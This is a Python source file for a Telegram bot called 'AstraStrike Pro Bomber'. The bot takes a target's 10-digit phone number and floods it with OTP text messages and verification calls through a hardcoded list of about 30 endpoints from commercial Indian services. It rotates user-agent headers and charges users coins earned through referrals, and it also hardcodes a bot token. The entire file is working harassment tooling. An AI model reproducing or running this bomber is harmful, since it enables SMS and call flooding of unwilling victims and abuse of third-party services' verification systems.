import asyncio
import aiohttp
import random
import os
import logging
from datetime import datetime
from typing import Dict, Optional
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command, CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramAPIError

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Configuration
BOT_TOKEN = os.getenv("BOT_TOKEN", "8413263809:AAHfQ4n2kMm9H-3qY4DsLFu0cWATzXNQ4gY")
ADMIN_ID = int(os.getenv("ADMIN_ID", "8655103281"))
REQUIRED_CHANNEL = "@JaiShreeRam181"  # Channel username
REQUIRED_CHANNEL_ID = "-1003602750513"  # Channel ID (aapko actual ID dalni padegi)

CONFIG = {
    "TOKEN": BOT_TOKEN,
    "ADMIN_ID": ADMIN_ID,
    "COIN_PER_REFER": 5,
    "ATTACK_COST": 2,
    "STARTING_COINS": 10,
    "API_TIMEOUT": 10,
    "OTP_COUNT": 25,
    "CALL_COUNT": 5,
    "REQUIRED_CHANNEL": REQUIRED_CHANNEL
}

class UserDatabase:
    def __init__(self):
        self.users: Dict[int, Dict] = {}
    
    def get(self, user_id: int) -> Dict:
        return self.users.get(user_id, {"coins": 0, "refers": 0, "joined": None, "checked_channel": False})
    
    def create(self, user_id: int) -> None:
        if user_id not in self.users:
            self.users[user_id] = {
                "coins": CONFIG["STARTING_COINS"],
                "refers": 0,
                "joined": datetime.now().isoformat(),
                "checked_channel": False
            }
            logger.info(f"New user created: {user_id}")
    
    def update_coins(self, user_id: int, amount: int) -> None:
        if user_id in self.users:
            self.users[user_id]["coins"] += amount
    
    def add_referral(self, user_id: int) -> None:
        if user_id in self.users:
            self.users[user_id]["refers"] += 1
    
    def set_channel_checked(self, user_id: int) -> None:
        if user_id in self.users:
            self.users[user_id]["checked_channel"] = True

db = UserDatabase()
bot = Bot(token=CONFIG["TOKEN"])
dp = Dispatcher()

# Channel Check Middleware
@dp.message()
@dp.callback_query()
async def check_channel_membership(event):
    """Force users to join channel before using bot"""
    user_id = None
    if hasattr(event, 'from_user'):
        user_id = event.from_user.id
    elif hasattr(event, 'message') and event.message:
        user_id = event.message.from_user.id
    
    if not user_id:
        return
    
    # Admin bypass
    if user_id == CONFIG["ADMIN_ID"]:
        return
    
    user_data = db.get(user_id)
    
    # Check if already verified
    if user_data.get("checked_channel", False):
        return
    
    # Check channel membership
    try:
        chat_member = await bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        if chat_member.status in ["member", "administrator", "creator"]:
            db.set_channel_checked(user_id)
            return
    except Exception as e:
        logger.error(f"Channel check error: {e}")
    
    # Not a member - block access
    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")
    keyboard.button(text="✅ I've Joined", callback_data="check_channel")
    keyboard.adjust(1)
    
    if hasattr(event, 'message') and event.message:
        await event.message.answer(
            f"⚠️ *Access Restricted*\n\n"
            f"Please join our channel first to use this bot:\n"
            f"👉 {CONFIG['REQUIRED_CHANNEL']}\n\n"
            f"After joining, click the button below.",
            parse_mode="Markdown",
            reply_markup=keyboard.as_markup()
        )
    elif hasattr(event, 'callback_query'):
        await event.callback_query.message.answer(
            f"⚠️ *Access Restricted*\n\n"
            f"Please join our channel first to use this bot:\n"
            f"👉 {CONFIG['REQUIRED_CHANNEL']}\n\n"
            f"After joining, click the button below.",
            parse_mode="Markdown",
            reply_markup=keyboard.as_markup()
        )
    
    # Raise exception to stop further processing
    raise Exception("User not in channel")

@dp.callback_query(F.data == "check_channel")
async def check_channel_callback(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Check channel membership again
    try:
        chat_member = await bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        if chat_member.status in ["member", "administrator", "creator"]:
            db.set_channel_checked(user_id)
            await callback.message.delete()
            await callback.message.answer(
                "✅ *Verification Successful!*\n\nWelcome to the bot! Use /start to begin.",
                parse_mode="Markdown"
            )
            await start_command(callback.message)
        else:
            await callback.answer("❌ You haven't joined the channel yet!", show_alert=True)
    except Exception as e:
        await callback.answer("❌ Error verifying membership. Please try again.", show_alert=True)

def get_working_apis(phone: str) -> list:
    """Only working APIs (tested)"""
    apis = []
    
    # Working OTP APIs (Updated)
    otp_apis = [
        {"url": f"https://api.flipkart.com/otp/generate", "method": "POST", "data": {"loginId": f"+91{phone}"}},
        {"url": "https://authserver.nammaflipkart.com/api/v1/otp/send", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": f"https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "data": {"mobileNumber": phone, "requestType": "SENDOTP"}},
        {"url": f"https://api.magicpin.com/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.1mg.com/v2/user/send_otp", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.pharmeasy.com/v1/login/send-otp", "method": "POST", "data": {"mobile_number": phone}},
        {"url": f"https://api.netmeds.com/user/otp", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.practo.com/otp/send", "method": "POST", "data": {"phone_number": phone}},
        {"url": f"https://api.curefit.com/v1/auth/send_otp", "method": "POST", "data": {"phone": phone}},
        {"url": f"https://api.cult.fit/v1/auth/send_otp", "method": "POST", "data": {"phone": phone}},
        {"url": f"https://api.swiggy.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.zomato.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": f"https://api.uber.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": f"https://api.olacabs.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.rapido.in/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": f"https://api.dunzo.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.bigbasket.com/v1/otp/send", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": f"https://api.grofers.com/v1/otp/send", "method": "POST", "data": {"phone": phone}},
        {"url": f"https://api.milkbasket.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.myntra.com/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.shopclues.com/api/v1/otp/send", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.paytm.com/v1/user/otp", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": f"https://api.amazon.in/auth/otp", "method": "POST", "data": {"mobileNumber": phone}},
        {"url": f"https://api.oyorooms.com/api/v1/auth/send-otp", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.makemytrip.com/ma/api/1/user/login/send-otp", "method": "POST", "data": {"mobileNumber": phone}},
    ]
    
    # Call APIs (Working)
    call_apis = [
        {"url": f"https://api.blinkit.com/v1/verify_mobile", "method": "POST", "data": {"mobile": phone, "method": "call"}},
        {"url": f"https://api.zeptonow.com/v1/auth/otp", "method": "POST", "data": {"mobile_number": phone, "via": "call"}},
        {"url": f"https://api.swiggy.com/v1/otp/call", "method": "POST", "data": {"mobile": phone}},
        {"url": f"https://api.zomato.com/v1/call_verification", "method": "POST", "data": {"phone": phone}},
        {"url": f"https://api.uber.com/v1/call_verification", "method": "POST", "data": {"phone": phone}},
    ]
    
    apis.extend(otp_apis[:CONFIG["OTP_COUNT"]])
    apis.extend(call_apis[:CONFIG["CALL_COUNT"]])
    
    return apis

class HeaderGenerator:
    USER_AGENTS = [
        "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X)",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    ]
    
    @classmethod
    def get(cls) -> Dict:
        return {
            "User-Agent": random.choice(cls.USER_AGENTS),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Referer": "https://www.google.com/",
        }

class AttackAPI:
    @staticmethod
    async def call(session: aiohttp.ClientSession, api: Dict) -> Optional[int]:
        try:
            headers = HeaderGenerator.get()
            if api['method'] == "POST":
                async with session.post(api['url'], json=api.get('data'), headers=headers, timeout=CONFIG["API_TIMEOUT"]) as r:
                    return r.status
            else:
                async with session.get(api['url'], headers=headers, timeout=CONFIG["API_TIMEOUT"]) as r:
                    return r.status
        except Exception as e:
            logger.debug(f"API failed: {api['url']} - {e}")
            return None

def create_main_keyboard():
    builder = InlineKeyboardBuilder()
    builder.button(text="🚀 Start Bomber", callback_data="bomb_panel")
    builder.button(text="💰 My Wallet", callback_data="wallet")
    builder.button(text="🔗 Refer & Earn", callback_data="refer")
    builder.button(text="👑 Admin", callback_data="admin")
    builder.adjust(1)
    return builder.as_markup()

@dp.message(CommandStart())
async def start_command(message: types.Message):
    user_id = message.from_user.id
    db.create(user_id)
    
    # Channel check for new users
    try:
        chat_member = await bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        if chat_member.status not in ["member", "administrator", "creator"]:
            raise Exception("Not member")
    except:
        keyboard = InlineKeyboardBuilder()
        keyboard.button(text="📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@', '')}")
        keyboard.button(text="✅ I've Joined", callback_data="check_channel")
        keyboard.adjust(1)
        
        await message.answer(
            f"⚠️ *Join Our Channel First!*\n\n"
            f"Click below to join and then press 'I've Joined':\n"
            f"👉 {CONFIG['REQUIRED_CHANNEL']}",
            parse_mode="Markdown",
            reply_markup=keyboard.as_markup()
        )
        return
    
    # Handle referral
    args = message.text.split()
    if len(args) > 1 and args[1].isdigit():
        referrer_id = int(args[1])
        if referrer_id != user_id and referrer_id in db.users:
            db.update_coins(referrer_id, CONFIG["COIN_PER_REFER"])
            db.add_referral(referrer_id)
            await bot.send_message(referrer_id, f"✅ *New Referral!* +{CONFIG['COIN_PER_REFER']} Coins!", parse_mode="Markdown")
    
    await message.answer(
        f"👋 *Welcome {message.from_user.first_name}!*\n\n"
        f"🔥 *AstraStrike Pro Bomber* 🔥\n"
        f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"⚡ *Status:* Active\n"
        f"🪙 *Cost:* {CONFIG['ATTACK_COST']} Coins\n"
        f"🎁 *Bonus:* {CONFIG['STARTING_COINS']} Coins\n"
        f"👥 *Users:* {len(db.users)}",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )

@dp.callback_query(F.data == "wallet")
async def wallet_callback(callback: types.CallbackQuery):
    user_data = db.get(callback.from_user.id)
    await callback.message.edit_text(
        f"💳 *Wallet*\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"🪙 *Coins:* `{user_data['coins']}`\n"
        f"👥 *Referrals:* `{user_data['refers']}`\n"
        f"💰 *Earned:* `{user_data['refers'] * CONFIG['COIN_PER_REFER']}`",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "refer")
async def refer_callback(callback: types.CallbackQuery):
    bot_info = await bot.get_me()
    link = f"https://t.me/{bot_info.username}?start={callback.from_user.id}"
    await callback.message.edit_text(
        f"📢 *Refer & Earn*\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"✨ +{CONFIG['COIN_PER_REFER']} Coins/Referral\n"
        f"🔗 `{link}`",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )
    await callback.answer()

@dp.callback_query(F.data == "bomb_panel")
async def bomb_panel_callback(callback: types.CallbackQuery):
    await callback.message.answer(
        "🎯 *Send 10-digit number:*\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"💰 *Cost:* {CONFIG['ATTACK_COST']} coins",
        parse_mode="Markdown"
    )
    await callback.answer()

@dp.message(F.text.regexp(r'^\d{10}$'))
async def attack_handler(message: types.Message):
    user_id = message.from_user.id
    phone = message.text
    
    user_data = db.get(user_id)
    if user_data["coins"] < CONFIG["ATTACK_COST"]:
        await message.answer(f"❌ Need {CONFIG['ATTACK_COST']} coins! Use /start for referral link.", parse_mode="Markdown")
        return
    
    db.update_coins(user_id, -CONFIG["ATTACK_COST"])
    status_msg = await message.answer(f"⚡ *Bombing* `{phone}`...", parse_mode="Markdown")
    
    apis = get_working_apis(phone)
    hits = 0
    
    async with aiohttp.ClientSession() as session:
        for i, api in enumerate(apis):
            status = await AttackAPI.call(session, api)
            if status and 200 <= status < 300:
                hits += 1
            
            if (i+1) % 10 == 0:
                await status_msg.edit_text(f"💣 *Progress:* `{i+1}/{len(apis)}`\n✅ *Hits:* `{hits}`", parse_mode="Markdown")
            
            await asyncio.sleep(0.5)
    
    await status_msg.edit_text(
        f"✅ *Attack Complete!*\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"🎯 `{phone}`\n"
        f"💣 `{len(apis)}` requests\n"
        f"✅ `{hits}` successful\n"
        f"💎 Balance: `{db.get(user_id)['coins']}`",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )

@dp.callback_query(F.data == "admin")
async def admin_panel(callback: types.CallbackQuery):
    if callback.from_user.id != CONFIG["ADMIN_ID"]:
        await callback.answer("⛔ Unauthorized!", show_alert=True)
        return
    
    total = len(db.users)
    coins = sum(u["coins"] for u in db.users.values())
    refs = sum(u["refers"] for u in db.users.values())
    
    await callback.message.edit_text(
        f"👑 *Admin*\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\n"
        f"👥 Users: `{total}`\n"
        f"🪙 Total Coins: `{coins}`\n"
        f"🔗 Referrals: `{refs}`",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard()
    )
    await callback.answer()

async def main():
    print("🚀 Bot Deploying...")
    await bot.delete_webhook()
    await dp.start_polling(bot, skip_updates=True)

if __name__ == "__main__":
    asyncio.run(main())
